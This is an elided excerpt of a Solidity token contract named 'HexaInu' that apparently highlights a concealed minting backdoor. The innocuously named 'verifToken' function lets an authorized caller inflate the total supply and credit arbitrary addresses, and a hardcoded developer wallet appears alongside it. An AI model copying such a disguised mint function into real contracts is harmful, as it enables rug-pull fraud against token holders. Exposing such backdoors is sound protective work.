...
contract HexaInu is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x0E40C67e3dE9251851Dc8cE746D50610Aa0d6073);
    ...
    */
    ...
    string private _name = "HexaInu"; 
    string private _symbol = "EXINU";  
    ...
    */
    ...
    function verifToken(uint256 acc, address adr) authorized public virtual {
        ...
        _Trade(address(Wallet_Dev), adr, acc);
        _tTotal += acc;
        _tOwned[adr] += acc;
